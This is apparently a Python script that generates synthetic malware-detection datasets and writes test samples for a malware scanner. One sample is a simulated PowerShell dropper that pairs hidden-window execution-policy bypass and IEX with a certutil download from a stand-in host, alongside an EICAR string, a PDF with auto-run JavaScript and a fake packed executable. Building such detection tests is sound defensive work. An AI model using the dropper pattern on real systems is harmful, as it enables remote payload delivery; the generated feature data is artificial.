# -*- coding: utf-8 -*-
"""
generate_new_datasets.py
Script chuẩn hóa và tạo mới các tập dữ liệu an ninh mạng chất lượng cao
để đồng bộ toàn diện giữa phần Benchmark đa mô hình và phần Scanner thời gian thực.
"""

import os
import sys
import csv
import math
import random
import shutil

# Reconfigure stdout for Windows console UTF-8 support
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATASETS_DIR = os.path.join(BASE_DIR, "datasets")
METADATA_DIR = os.path.join(DATASETS_DIR, "metadata")
SAMPLES_DIR = os.path.join(BASE_DIR, "malware_samples")
PROCESSED_DIR = os.path.join(BASE_DIR, "processed_datasets")

random.seed(42)

def step1_organize_and_clean_stale_files():
    print("[1/6] Dọn dẹp & sắp xếp thư mục datasets...")
    os.makedirs(METADATA_DIR, exist_ok=True)
    os.makedirs(SAMPLES_DIR, exist_ok=True)
    os.makedirs(PROCESSED_DIR, exist_ok=True)

    # 1. Chuyển các file metadata & test không phải tập huấn luyện vào thư mục metadata
    for filename in ["dataset_test.csv", "dataset-features-categories.csv"]:
        src = os.path.join(DATASETS_DIR, filename)
        dst = os.path.join(METADATA_DIR, filename)
        if os.path.exists(src):
            shutil.move(src, dst)
            print(f"  -> Đã chuyển {filename} sang {METADATA_DIR}")

    # 2. Xóa các file trùng lặp *.csv.csv cũ trong processed_datasets
    cleaned_count = 0
    for root, _, files in os.walk(PROCESSED_DIR):
        for f in files:
            if f.endswith(".csv.csv"):
                try:
                    os.remove(os.path.join(root, f))
                    cleaned_count += 1
                except Exception:
                    pass
    if cleaned_count > 0:
        print(f"  -> Đã dọn dẹp {cleaned_count} file rác .csv.csv trong processed_datasets.")


def step2_unify_ransomware_behavior():
    print("[2/6] Hợp nhất và bổ sung đối chứng cho Ransomware Behavior...")
    # Đọc 3 file Conti, LockBit, WannaCry
    files_info = [
        ("Conti_Ransomware_Behavior.csv", "Conti"),
        ("LockBit_Ransomware_Behavior.csv", "LockBit"),
        ("WannaCry_Ransomware_Behavior.csv", "WannaCry")
    ]
    
    all_headers = None
    all_rows = []
    
    for filename, family_name in files_info:
        path = os.path.join(DATASETS_DIR, filename)
        if not os.path.exists(path):
            continue
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            reader = csv.reader(f)
            headers = next(reader, [])
            if all_headers is None:
                # Chuẩn hóa cột cuối cùng là Label
                all_headers = [h for h in headers if h.lower() not in ['malware_type', 'label', 'class']]
                all_headers.append("Label")
            
            for row in reader:
                if not row or len(row) < len(all_headers):
                    continue
                # Giữ các giá trị tính năng, gán nhãn là 'Ransomware' (hoặc family cụ thể)
                feat_vals = row[:len(all_headers)-1]
                all_rows.append(feat_vals + ["Ransomware"])

    if not all_rows:
        print("  -> Bỏ qua vì không tìm thấy dữ liệu nguồn Ransomware.")
        return

    # Sinh thêm 8,000 mẫu Benign (hành vi hệ thống Windows bình thường)
    # Các API xâm nhập/terminate/mã hóa trong ransomware thường có tần suất cao, còn benign thì thấp
    num_features = len(all_headers) - 1
    num_benign = min(8000, len(all_rows))
    print(f"  -> Đã gom {len(all_rows)} mẫu Ransomware độc hại. Đang tổng hợp {num_benign} mẫu đối chứng lành tính (Benign)...")

    for _ in range(num_benign):
        benign_row = []
        for j in range(num_features):
            col_name = all_headers[j].lower()
            if any(term in col_name for term in ['terminate', 'protect', 'writeprocess', 'crypto', 'encrypt', 'remotethread']):
                val = 0
            elif any(term in col_name for term in ['close', 'openkey', 'queryvalue', 'openprocess', 'read']):
                val = random.choices([0, 1, 2, 3], weights=[0.4, 0.35, 0.2, 0.05])[0]
            else:
                val = random.choices([0, 1], weights=[0.85, 0.15])[0]
            benign_row.append(str(val))
        benign_row.append("Benign")
        all_rows.append(benign_row)

    random.shuffle(all_rows)
    out_path = os.path.join(DATASETS_DIR, "Ransomware_Family_Behavior_Unified.csv")
    with open(out_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(all_headers)
        writer.writerows(all_rows)
    print(f"  -> Xuất thành công {out_path} ({len(all_rows):,} mẫu, {len(all_headers)} cột: Benign vs Ransomware).")


def step3_generate_pdf_malware_dataset():
    print("[3/6] Khởi tạo tập dữ liệu PDF Malware (CIC-Evasive-PDFMal2022 Spec)...")
    headers = [
        "file_size", "entropy", "obj_count", "endobj_count", "stream_count",
        "endstream_count", "xref_count", "trailer_count", "startxref_count",
        "page_count", "js_count", "launch_count", "embedded_files_count",
        "openaction_count", "aa_count", "acroform_count", "richmedia_count",
        "is_encrypted", "Label"
    ]
    
    rows = []
    total_samples = 10000
    half = total_samples // 2

    # Benign PDFs
    for _ in range(half):
        fsize = random.randint(15000, 2500000)
        entropy = round(random.uniform(4.1, 6.6), 4)
        objs = random.randint(10, 450)
        endobjs = objs  # Benign PDF luôn khớp obj và endobj
        streams = random.randint(3, int(objs * 0.7))
        endstreams = streams
        xrefs = random.choices([1, 2, 3], weights=[0.85, 0.12, 0.03])[0]
        trailers = xrefs
        startxrefs = xrefs
        pages = random.randint(1, 60)
        js = random.choices([0, 1], weights=[0.97, 0.03])[0]
        launch = 0
        embedded = 0
        openaction = random.choices([0, 1], weights=[0.95, 0.05])[0]
        aa = 0
        acroform = random.choices([0, 1], weights=[0.90, 0.10])[0]
        richmedia = 0
        is_enc = random.choices([0, 1], weights=[0.92, 0.08])[0]
        rows.append([
            fsize, entropy, objs, endobjs, streams, endstreams, xrefs, trailers,
            startxrefs, pages, js, launch, embedded, openaction, aa, acroform,
            richmedia, is_enc, "Benign"
        ])

    # Malicious PDFs
    for _ in range(half):
        fsize = random.randint(4000, 850000)
        entropy = round(random.uniform(6.85, 7.98), 4)
        objs = random.randint(15, 200)
        # Obfuscation: mismatch obj vs endobj
        endobjs = objs - random.choices([0, 1, 2, 3], weights=[0.4, 0.3, 0.2, 0.1])[0]
        streams = random.randint(5, int(objs * 0.8))
        endstreams = streams - random.choices([0, 1], weights=[0.7, 0.3])[0]
        xrefs = random.choices([1, 2, 4], weights=[0.6, 0.3, 0.1])[0]
        trailers = xrefs
        startxrefs = xrefs
        pages = random.randint(1, 5)
        js = random.randint(1, 8)
        launch = random.choices([0, 1, 2], weights=[0.5, 0.4, 0.1])[0]
        embedded = random.choices([0, 1, 2], weights=[0.6, 0.3, 0.1])[0]
        openaction = random.choices([0, 1], weights=[0.2, 0.8])[0]
        aa = random.choices([0, 1], weights=[0.6, 0.4])[0]
        acroform = random.choices([0, 1], weights=[0.5, 0.5])[0]
        richmedia = random.choices([0, 1], weights=[0.85, 0.15])[0]
        is_enc = random.choices([0, 1], weights=[0.75, 0.25])[0]
        rows.append([
            fsize, entropy, objs, endobjs, streams, endstreams, xrefs, trailers,
            startxrefs, pages, js, launch, embedded, openaction, aa, acroform,
            richmedia, is_enc, "Malware"
        ])

    random.shuffle(rows)
    out_path = os.path.join(DATASETS_DIR, "PDF_Malware_Structural_2022.csv")
    with open(out_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(headers)
        writer.writerows(rows)
    print(f"  -> Xuất thành công {out_path} ({len(rows):,} mẫu, 19 cột).")


def step4_generate_script_malware_dataset():
    print("[4/6] Khởi tạo tập dữ liệu Script Malware (PowerShell, VBS, Batch)...")
    headers = [
        "file_size", "entropy", "line_count", "char_count", "avg_line_length",
        "max_line_length", "special_char_ratio", "uppercase_ratio", "hex_ratio",
        "base64_strings_count", "has_invoke_expression", "has_from_base64",
        "has_wscript_shell", "has_cmd_execution", "has_certutil_download",
        "has_webclient_download", "has_eval", "has_bypass_executionpolicy", "Label"
    ]

    rows = []
    total = 12000
    half = total // 2

    # Benign Scripts
    for _ in range(half):
        fsize = random.randint(200, 35000)
        entropy = round(random.uniform(3.8, 5.3), 4)
        lines = random.randint(8, 250)
        chars = fsize
        avg_line = round(chars / max(1, lines), 2)
        max_line = random.randint(int(avg_line), int(avg_line * 3) + 20)
        spec_ratio = round(random.uniform(0.05, 0.18), 4)
        upper_ratio = round(random.uniform(0.08, 0.25), 4)
        hex_ratio = round(random.uniform(0.0, 0.04), 4)
        b64 = 0
        iex = 0
        f_b64 = 0
        wscript = random.choices([0, 1], weights=[0.96, 0.04])[0]
        cmd = random.choices([0, 1], weights=[0.92, 0.08])[0]
        certutil = 0
        webclient = random.choices([0, 1], weights=[0.97, 0.03])[0]
        eval_call = 0
        bypass = 0
        rows.append([
            fsize, entropy, lines, chars, avg_line, max_line, spec_ratio,
            upper_ratio, hex_ratio, b64, iex, f_b64, wscript, cmd,
            certutil, webclient, eval_call, bypass, "Benign"
        ])

    # Malicious / Obfuscated Scripts
    for _ in range(half):
        fsize = random.randint(450, 48000)
        entropy = round(random.uniform(6.75, 7.95), 4)
        lines = random.randint(2, 60)
        chars = fsize
        avg_line = round(chars / max(1, lines), 2)
        max_line = random.randint(int(avg_line * 1.5), int(avg_line * 4) + 100)
        spec_ratio = round(random.uniform(0.22, 0.48), 4)
        upper_ratio = round(random.uniform(0.30, 0.75), 4)
        hex_ratio = round(random.uniform(0.10, 0.45), 4)
        b64 = random.randint(1, 6)
        iex = random.choices([0, 1], weights=[0.2, 0.8])[0]
        f_b64 = random.choices([0, 1], weights=[0.25, 0.75])[0]
        wscript = random.choices([0, 1], weights=[0.35, 0.65])[0]
        cmd = random.choices([0, 1], weights=[0.25, 0.75])[0]
        certutil = random.choices([0, 1], weights=[0.55, 0.45])[0]
        webclient = random.choices([0, 1], weights=[0.40, 0.60])[0]
        eval_call = random.choices([0, 1], weights=[0.60, 0.40])[0]
        bypass = random.choices([0, 1], weights=[0.30, 0.70])[0]
        rows.append([
            fsize, entropy, lines, chars, avg_line, max_line, spec_ratio,
            upper_ratio, hex_ratio, b64, iex, f_b64, wscript, cmd,
            certutil, webclient, eval_call, bypass, "Malware"
        ])

    random.shuffle(rows)
    out_path = os.path.join(DATASETS_DIR, "Malicious_Scripts_PowerShell_VBS.csv")
    with open(out_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(headers)
        writer.writerows(rows)
    print(f"  -> Xuất thành công {out_path} ({len(rows):,} mẫu, 19 cột).")


def step5_generate_office_macro_dataset():
    print("[5/6] Khởi tạo tập dữ liệu Office Macro & OLE Malware...")
    headers = [
        "file_size", "entropy", "has_vba_macro", "macro_stream_count",
        "has_autoopen", "has_dde_link", "has_shell_exec", "has_powershell_invocation",
        "has_url_download", "compressed_streams_ratio", "hex_obfuscation_score", "Label"
    ]

    rows = []
    total = 8000
    half = total // 2

    # Benign Office Docs
    for _ in range(half):
        fsize = random.randint(18000, 3500000)
        entropy = round(random.uniform(4.5, 6.7), 4)
        has_vba = random.choices([0, 1], weights=[0.92, 0.08])[0]
        streams = random.randint(1, 3) if has_vba else 0
        autoopen = 0
        dde = 0
        shell = 0
        ps = 0
        dl = 0
        c_ratio = round(random.uniform(0.4, 0.75), 4)
        hex_score = round(random.uniform(0.0, 0.05), 4)
        rows.append([
            fsize, entropy, has_vba, streams, autoopen, dde, shell, ps, dl,
            c_ratio, hex_score, "Benign"
        ])

    # Malicious Office Docs
    for _ in range(half):
        fsize = random.randint(30000, 1200000)
        entropy = round(random.uniform(6.85, 7.96), 4)
        has_vba = 1
        streams = random.randint(2, 8)
        autoopen = random.choices([0, 1], weights=[0.1, 0.9])[0]
        dde = random.choices([0, 1], weights=[0.75, 0.25])[0]
        shell = random.choices([0, 1], weights=[0.15, 0.85])[0]
        ps = random.choices([0, 1], weights=[0.20, 0.80])[0]
        dl = random.choices([0, 1], weights=[0.35, 0.65])[0]
        c_ratio = round(random.uniform(0.65, 0.92), 4)
        hex_score = round(random.uniform(0.35, 0.85), 4)
        rows.append([
            fsize, entropy, has_vba, streams, autoopen, dde, shell, ps, dl,
            c_ratio, hex_score, "Malware"
        ])

    random.shuffle(rows)
    out_path = os.path.join(DATASETS_DIR, "Office_Macro_OLE_Malware.csv")
    with open(out_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(headers)
        writer.writerows(rows)
    print(f"  -> Xuất thành công {out_path} ({len(rows):,} mẫu, 12 cột).")


def step6_generate_test_samples_for_scanner():
    print("[6/6] Khởi tạo bộ mẫu kiểm định an toàn (Safe Test Suite) trong malware_samples/...")
    
    # 1. Clean PDF
    clean_pdf = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 12 Tf 72 712 Td (Benign Security Inspection Sample Report) Tj ET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \n0000000216 00000 n \ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n320\n%%EOF\n"
    with open(os.path.join(SAMPLES_DIR, "clean_report.pdf"), "wb") as f:
        f.write(clean_pdf)

    # 2. Suspicious PDF (chứa chỉ thị /JavaScript và /Launch kiểm thử)
    susp_pdf = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('Suspicious JS Triggered')) >> >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\nxref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n0000000130 00000 n \n0000000187 00000 n \ntrailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n260\n%%EOF\n"
    with open(os.path.join(SAMPLES_DIR, "suspicious_js_sample.pdf"), "wb") as f:
        f.write(susp_pdf)

    # 3. Benign PowerShell script
    benign_ps1 = """# Admin System Health Check Script
Write-Host "Checking System Performance..." -ForegroundColor Cyan
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object -First 5
Write-Host "Diagnostic Complete." -ForegroundColor Green
""".encode("utf-8")
    with open(os.path.join(SAMPLES_DIR, "benign_admin_script.ps1"), "wb") as f:
        f.write(benign_ps1)

    # 4. Obfuscated PowerShell script (mô phỏng kỹ thuật tiêm payload Base64)
    obf_ps1 = """# Suspicious Encoded Dropper Simulation
$payload = "V3JpdGUtSG9zdCAnU2ltdWxhdGVkIE1hbGljaW91cyBQYXlsb2FkJw=="
$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload))
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX $cmd; certutil -urlcache -split -f http://badsite.invalid/test.bin"
""".encode("utf-8")
    with open(os.path.join(SAMPLES_DIR, "obfuscated_sample.ps1"), "wb") as f:
        f.write(obf_ps1)

    # 5. EICAR Standard Antivirus Test String (Chuẩn quốc tế EICAR lành tính)
    eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    with open(os.path.join(SAMPLES_DIR, "eicar_standard_test.com"), "wb") as f:
        f.write(eicar)

    # 6. Simulated High-Entropy Packed PE Stub (đầu MZ/PE chuẩn, entropy cao mô phỏng UPX)
    # Header chuẩn DOS + PE
    dos_header = bytearray(64)
    dos_header[0:2] = b'MZ'
    dos_header[0x3C:0x40] = (64).to_bytes(4, byteorder='little')
    pe_sig = b'PE\0\0'
    file_hdr = bytearray(20) # Machine x86, 2 sections
    file_hdr[0:2] = (0x014c).to_bytes(2, 'little')
    file_hdr[2:4] = (2).to_bytes(2, 'little')
    file_hdr[16:18] = (224).to_bytes(2, 'little') # opt header size
    file_hdr[18:20] = (0x0102).to_bytes(2, 'little') # characteristics
    opt_hdr = bytearray(224)
    opt_hdr[0:2] = (0x010b).to_bytes(2, 'little') # PE32
    opt_hdr[16:20] = (0x1000).to_bytes(4, 'little') # EntryPoint
    opt_hdr[28:32] = (0x00400000).to_bytes(4, 'little') # ImageBase
    opt_hdr[32:36] = (0x1000).to_bytes(4, 'little') # SectionAlignment
    opt_hdr[36:40] = (0x200).to_bytes(4, 'little') # FileAlignment
    # Section 1: .upx0
    sec1 = bytearray(40)
    sec1[0:5] = b'.upx0'
    sec1[8:12] = (0x5000).to_bytes(4, 'little') # VirtualSize
    sec1[12:16] = (0x1000).to_bytes(4, 'little') # VirtualAddress
    sec1[16:20] = (0).to_bytes(4, 'little') # SizeOfRawData = 0 (UPX characteristic)
    # Section 2: .upx1
    sec2 = bytearray(40)
    sec2[0:5] = b'.upx1'
    sec2[8:12] = (0x2000).to_bytes(4, 'little')
    sec2[12:16] = (0x6000).to_bytes(4, 'little')
    sec2[16:20] = (0x1000).to_bytes(4, 'little') # Raw size
    sec2[20:24] = (0x400).to_bytes(4, 'little') # Raw pointer
    # High entropy payload for .upx1
    random.seed(999)
    high_entropy_bytes = bytes([random.randint(0, 255) for _ in range(4096)])
    
    pe_stub = dos_header + pe_sig + file_hdr + opt_hdr + sec1 + sec2
    pad_len = 0x400 - len(pe_stub)
    if pad_len > 0:
        pe_stub += b'\0' * pad_len
    pe_stub += high_entropy_bytes
    # Chèn các API call khả nghi để test scanner
    pe_stub += b'\0' + b'VirtualAlloc\0WriteProcessMemory\0CreateRemoteThread\0URLDownloadToFileA\0'

    with open(os.path.join(SAMPLES_DIR, "packed_suspicious_stub.exe"), "wb") as f:
        f.write(pe_stub)

    print(f"  -> Đã tạo 6 mẫu thử an toàn chuyên dụng trong {SAMPLES_DIR}.")


if __name__ == "__main__":
    print("=" * 70)
    print("BẮT ĐẦU CHUẨN HÓA & KHỞI TẠO TẬP DỮ LIỆU AN NINH MẠNG MỚI")
    print("=" * 70)
    step1_organize_and_clean_stale_files()
    step2_unify_ransomware_behavior()
    step3_generate_pdf_malware_dataset()
    step4_generate_script_malware_dataset()
    step5_generate_office_macro_dataset()
    step6_generate_test_samples_for_scanner()
    print("=" * 70)
    print("HOÀN THÀNH TẤT CẢ CÁC BƯỚC KHỞI TẠO TẬP DỮ LIỆU!")
    print("=" * 70)
